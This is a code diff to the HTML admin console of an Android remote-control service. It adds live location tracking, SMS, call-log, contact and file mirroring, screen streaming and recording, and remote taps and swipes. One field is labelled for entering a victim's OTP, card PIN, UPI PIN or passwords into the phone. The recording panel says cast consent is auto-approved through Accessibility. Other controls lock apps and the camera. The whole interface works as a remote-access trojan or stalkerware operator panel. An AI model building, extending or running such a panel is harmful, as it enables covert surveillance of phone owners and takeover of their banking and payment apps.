@@ -10,7 +10,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="/device/styles.css?v=15" />
-  <link rel="stylesheet" href="/device/admin/admin.css?v=14" />
+  <link rel="stylesheet" href="/device/admin/admin.css?v=15" />
   <script>
     // Admin must not be controlled by the device PWA service worker (can break module login).
     if ("serviceWorker" in navigator) {
@@ -199,9 +199,12 @@
           </div>
           <div id="admin-panel-location" class="phone-tab-panel" data-phone-panel="location" hidden>
             <div class="tab-toolbar">
-              <p class="page-sub">Cached GPS from the phone. Sync to refresh.</p>
+              <p class="page-sub">Opens the map automatically. Phone needs Location Sharing on.</p>
               <div class="page-actions">
-                <button type="button" class="btn-secondary" data-admin-cmd="LOCATION_GET_CURRENT">Update location</button>
+                <button type="button" class="btn-secondary" id="btn-admin-loc-refresh">Refresh map</button>
+                <button type="button" class="btn-primary" data-admin-cmd="LOCATION_GET_CURRENT">Update location</button>
+                <button type="button" class="btn-secondary" data-admin-cmd="LOCATION_START_LIVE" data-admin-payload='{"durationMinutes":15}'>Live 15m</button>
+                <button type="button" class="btn-secondary" data-admin-cmd="LOCATION_STOP">Stop</button>
               </div>
             </div>
             <div id="admin-location-body" class="surface muted">Loading…</div>
@@ -233,6 +236,13 @@
               <button type="button" class="gallery-filter" data-gallery-filter="file">Files</button>
             </div>
             <div id="admin-gallery-body" class="surface muted">Loading…</div>
+            <div id="admin-gallery-inline-viewer" class="files-inline-viewer" hidden>
+              <div class="files-inline-head">
+                <strong id="admin-gallery-inline-title"></strong>
+                <button type="button" class="btn-secondary" id="btn-admin-gallery-inline-close">Close preview</button>
+              </div>
+              <div id="admin-gallery-inline-body" class="files-inline-body"></div>
+            </div>
           </div>
           <div id="admin-panel-notifications" class="phone-tab-panel" data-phone-panel="notifications" hidden>
             <div class="tab-toolbar">
@@ -249,6 +259,7 @@
               <p class="page-sub">SMS / messages mirrored from the phone.</p>
               <div class="page-actions">
                 <button type="button" class="btn-primary" data-admin-cmd="MESSAGES_SYNC">Sync from phone</button>
+                <button type="button" class="btn-secondary" id="btn-admin-messages-refresh">Refresh</button>
               </div>
             </div>
             <div id="admin-messages-body" class="surface muted">Loading…</div>
@@ -258,6 +269,7 @@
               <p class="page-sub">Call history cached from the phone.</p>
               <div class="page-actions">
                 <button type="button" class="btn-primary" data-admin-cmd="CALL_LOGS_SYNC">Sync from phone</button>
+                <button type="button" class="btn-secondary" id="btn-admin-call-logs-refresh">Refresh</button>
               </div>
             </div>
             <div id="admin-call-logs-body" class="surface muted">Loading…</div>
@@ -267,44 +279,203 @@
               <p class="page-sub">Contacts cached from the phone.</p>
               <div class="page-actions">
                 <button type="button" class="btn-primary" data-admin-cmd="CONTACTS_SYNC">Sync from phone</button>
+                <button type="button" class="btn-secondary" id="btn-admin-contacts-refresh">Refresh</button>
               </div>
             </div>
             <div id="admin-contacts-body" class="surface muted">Loading…</div>
           </div>
           <div id="admin-panel-files" class="phone-tab-panel" data-phone-panel="files" hidden>
             <div class="tab-toolbar">
-              <p class="page-sub">Shared folders granted on the phone.</p>
+              <p class="page-sub">Tap <strong>List folder</strong>, then open a folder card to browse files. Tap <strong>Download</strong> for progress, then <strong>View</strong> / <strong>Play</strong> below.</p>
               <div class="page-actions">
-                <button type="button" class="btn-secondary" data-admin-cmd="FILE_LIST">Refresh folders</button>
+                <button type="button" class="btn-secondary" id="btn-admin-files-up" hidden>Up</button>
+                <button type="button" class="btn-primary" id="btn-admin-files-refresh">Refresh</button>
+                <button type="button" class="btn-secondary" id="btn-admin-files-list">List folder</button>
               </div>
             </div>
+            <p id="admin-files-breadcrumb" class="files-breadcrumb muted">Root</p>
+            <p id="admin-files-sync-status" class="files-sync-status muted" hidden></p>
             <div id="admin-files-body" class="surface muted">Loading…</div>
+            <div id="admin-files-inline-viewer" class="files-inline-viewer" hidden>
+              <div class="files-inline-head">
+                <strong id="admin-files-inline-title"></strong>
+                <button type="button" class="btn-secondary" id="btn-admin-files-inline-close">Close preview</button>
+              </div>
+              <div id="admin-files-inline-body" class="files-inline-body"></div>
+            </div>
           </div>
           <div id="admin-panel-screen" class="phone-tab-panel" data-phone-panel="screen" hidden>
             <div class="tab-toolbar">
-              <p class="page-sub">Screen mirror needs Android system cast consent on the phone.</p>
+              <p class="page-sub">Live screen via MediaProjection + WebRTC. Starts via Platform Admin (user browsers stay paired). <strong>Lock screen</strong> needs Device Admin on the phone.</p>
+              <div class="page-actions">
+                <button type="button" class="btn-primary" id="btn-admin-screen-start">Start Mirroring</button>
+                <button type="button" class="btn-secondary" id="btn-admin-screen-stop">Stop</button>
+                <button type="button" class="btn-secondary" id="btn-admin-screen-lock">Lock screen</button>
+                <button type="button" class="btn-secondary" id="btn-admin-screen-unlock">Unlock / Wake</button>
+                <button type="button" class="btn-secondary" id="btn-admin-screen-fullscreen">Fullscreen</button>
+                <button type="button" class="btn-secondary" id="btn-admin-screen-pip">PiP</button>
+                <button type="button" class="btn-secondary" id="btn-admin-screen-shot">Screenshot</button>
+              </div>
             </div>
-            <div id="admin-screen-body" class="surface"></div>
+            <div class="screen-controls surface">
+              <label>Quality
+                <select id="admin-screen-quality" class="input">
+                  <option value="auto">Auto</option>
+                  <option value="720p" selected>720p</option>
+                  <option value="1080p">1080p</option>
+                </select>
+              </label>
+              <label>FPS
+                <select id="admin-screen-fps" class="input">
+                  <option value="15">15</option>
+                  <option value="30" selected>30</option>
+                  <option value="60">60</option>
+                </select>
+              </label>
+              <label class="chk"><input type="checkbox" id="admin-screen-audio" /> Audio</label>
+              <span id="admin-screen-status" class="status-badge">Idle</span>
+              <span id="admin-screen-stats" class="muted">Latency — · FPS — · Bandwidth —</span>
+            </div>
+            <div class="screen-controls surface rc-toolbar">
+              <label class="chk"><input type="checkbox" id="admin-rc-control-enabled" /> Remote Control</label>
+              <select id="admin-rc-gesture-mode" class="input" title="Gesture mode">
+                <option value="tap" selected>Tap</option>
+                <option value="double">Double tap</option>
+                <option value="long">Long press</option>
+                <option value="swipe">Swipe</option>
+                <option value="drag">Drag</option>
+              </select>
+              <button type="button" class="btn-secondary" id="btn-admin-rc-back">Back</button>
+              <button type="button" class="btn-secondary" id="btn-admin-rc-home">Home</button>
+              <button type="button" class="btn-secondary" id="btn-admin-rc-recents">Recents</button>
+              <button type="button" class="btn-secondary" id="btn-admin-rc-notif">Notifications</button>
+              <button type="button" class="btn-secondary" id="btn-admin-rc-tree">Refresh elements</button>
+              <button type="button" class="btn-danger" id="btn-admin-rc-stop">Emergency Stop</button>
+              <span id="admin-rc-status" class="status-badge">View only</span>
+            </div>
+            <p id="screen-live-status" class="muted" aria-live="polite"></p>
+            <div class="screen-stage surface" id="admin-screen-stage">
+              <video id="admin-screen-video" class="admin-live-video" autoplay playsinline muted hidden></video>
+              <audio id="admin-screen-audio-el" hidden></audio>
+              <div id="admin-rc-touch-marker" class="rc-touch-marker" hidden></div>
+              <canvas id="admin-screen-shot-canvas" hidden></canvas>
+            </div>
+            <div class="rc-panels">
+              <div class="surface rc-text-panel">
+                <label>Type on phone (OTP, card PIN, UPI PIN, passwords)
+                  <input id="admin-rc-text-input" class="input" type="password" maxlength="2000" placeholder="OTP, PIN, or password for focused field" autocomplete="off" />
+                </label>
+                <label class="chk" style="margin-top:8px;display:flex;align-items:center;gap:8px">
+                  <input type="checkbox" id="admin-rc-text-show" /> Show typed characters
+                </label>
+                <div class="row-gap">
+                  <button type="button" class="btn-primary" id="btn-admin-rc-set-text">Insert text</button>
+                  <button type="button" class="btn-secondary" id="btn-admin-rc-clear-text">Clear field</button>
+                </div>
+                <p class="muted" style="margin:8px 0 0;font-size:0.82rem">
+                  Tap the OTP / PIN / password box on the mirrored screen first, then Insert.
+                </p>
+              </div>
+              <div class="surface rc-tree-panel">
+                <div class="surface-head">
+                  <h2>Element inspector</h2>
+                  <input id="admin-rc-tree-search" class="input" type="search" placeholder="Filter elements" />
+                </div>
+                <p id="admin-rc-tree-meta" class="muted">No tree yet.</p>
+                <div id="admin-rc-tree-list" class="rc-tree-list muted">Start Remote Control, then Refresh elements.</div>
+              </div>
+            </div>
+            <div id="admin-screen-shot-preview" class="surface muted" hidden></div>
           </div>
           <div id="admin-panel-recording" class="phone-tab-panel" data-phone-panel="recording" hidden>
             <div class="tab-toolbar">
-              <p class="page-sub">Start/Stop like the user panel (Android cast consent on the phone). Completed recordings can be played and downloaded here.</p>
-              <div class="page-actions">
-                <button type="button" class="btn-primary" id="btn-admin-rec-start">Start recording</button>
-                <button type="button" class="btn-danger-soft" id="btn-admin-rec-stop">Stop</button>
-                <button type="button" class="btn-secondary" id="btn-admin-rec-refresh">Refresh list</button>
+              <p class="page-sub">Record the phone screen (private Storage upload). Cast permission is <strong>auto-approved</strong> when Accessibility is on.</p>
+              <div class="page-actions rec-actions">
+                <button type="button" class="btn-primary" id="btn-admin-rec-start">Record Screen</button>
+                <button type="button" class="btn-secondary" id="btn-admin-rec-pause">Pause</button>
+                <button type="button" class="btn-secondary" id="btn-admin-rec-resume" hidden>Resume</button>
+                <button type="button" class="btn-secondary" id="btn-admin-rec-stop">Stop</button>
+                <button type="button" class="btn-secondary" id="btn-admin-rec-refresh">Refresh</button>
               </div>
             </div>
+            <div class="screen-controls surface">
+              <label>Quality
+                <select id="admin-rec-quality" class="input">
+                  <option value="480p">480p</option>
+                  <option value="720p" selected>720p</option>
+                  <option value="1080p">1080p</option>
+                </select>
+              </label>
+              <label>FPS
+                <select id="admin-rec-fps" class="input">
+                  <option value="15">15</option>
+                  <option value="30" selected>30</option>
+                  <option value="60">60</option>
+                </select>
+              </label>
+              <label class="chk"><input type="checkbox" id="admin-rec-mic" /> Screen + Mic</label>
+              <span id="admin-rec-status" class="status-badge">Idle</span>
+              <strong id="admin-rec-timer" class="rec-timer" aria-live="polite">00:00</strong>
+            </div>
+            <div id="admin-rec-transfer" class="surface muted" hidden>Upload progress will appear here.</div>
             <div id="admin-recording-body" class="surface muted">Loading…</div>
+            <div id="admin-rec-inline-viewer" class="files-inline-viewer" hidden>
+              <div class="files-inline-head">
+                <strong id="admin-rec-inline-title"></strong>
+                <button type="button" class="btn-secondary" id="btn-admin-rec-inline-close">Close preview</button>
+              </div>
+              <div id="admin-rec-inline-body" class="files-inline-body"></div>
+            </div>
           </div>
           <div id="admin-panel-apps" class="phone-tab-panel" data-phone-panel="apps" hidden>
             <div class="tab-toolbar">
-              <p class="page-sub">Installed apps list. Lock needs Accessibility on the phone.</p>
+              <p class="page-sub">Lock or unlock any app with the duration below. Phone needs App Control (Accessibility). Platform Admin client — user browsers stay paired.</p>
               <div class="page-actions">
-                <button type="button" class="btn-primary" data-admin-cmd="APPS_INDEX">Sync apps</button>
+                <button type="button" class="btn-secondary" data-admin-cmd="APPS_INDEX">Sync from phone</button>
+                <button type="button" class="btn-primary" id="btn-admin-apps-refresh">Refresh</button>
+                <button type="button" class="btn-secondary" id="btn-admin-apps-export">Export list</button>
               </div>
             </div>
-            <div id="admin-apps-body" class="surface muted">Loading…</div>
+            <div class="screen-controls surface app-control-bar">
+              <label>Lock duration
+                <select id="admin-apps-block-duration" class="input">
+                  <option value="15">15 minutes</option>
+                  <option value="30" selected>30 minutes</option>
+                  <option value="60">1 hour</option>
+                  <option value="120">2 hours</option>
+                  <option value="360">6 hours</option>
+                  <option value="1440">24 hours</option>
+                  <option value="0">Until I unlock</option>
+                </select>
+              </label>
+              <button type="button" class="btn-secondary" id="btn-admin-blocks-refresh">Refresh locks</button>
+              <span class="app-control-sep muted">Camera hardware</span>
+              <button type="button" class="btn-secondary" id="btn-admin-camera-lock">Lock camera</button>
+              <button type="button" class="btn-secondary" id="btn-admin-camera-unlock">Unlock camera</button>
+            </div>
+            <div id="admin-apps-blocks" class="apps-blocks surface muted">No apps locked.</div>
+            <div class="screen-controls surface">
+              <input id="admin-apps-search" class="input" type="search" placeholder="Search WhatsApp, YouTube, Instagram…" />
+              <label>Filter
+                <select id="admin-apps-filter" class="input">
+                  <option value="user" selected>User apps</option>
+                  <option value="all">All apps</option>
+                  <option value="blocked">Locked now</option>
+                  <option value="system">System</option>
+                  <option value="games">Games</option>
+                  <option value="social">Social</option>
+                  <option value="finance">Finance</option>
+                  <option value="shopping">Shopping</option>
+                  <option value="productivity">Productivity</option>
+                  <option value="tools">Tools</option>
+                  <option value="installed_today">Installed today</option>
+                  <option value="updated_today">Updated today</option>
+                  <option value="disabled">Disabled</option>
+                </select>
+              </label>
+            </div>
+            <div id="admin-apps-list" class="apps-list muted">Select a device.</div>
+            <div id="admin-app-detail" class="surface app-detail" hidden></div>
           </div>
           <div id="admin-panel-app-usage" class="phone-tab-panel" data-phone-panel="app-usage" hidden>
             <div class="tab-toolbar">
@@ -379,7 +550,7 @@
     </div>
   </div>
 
-  <script type="module" src="/device/admin/app.js?v=18"></script>
+  <script type="module" src="/device/admin/app.js?v=21"></script>
   <script>
     // If the module fails to load, surface a visible error (otherwise Sign in does nothing).
     window.addEventListener("error", function (ev) {
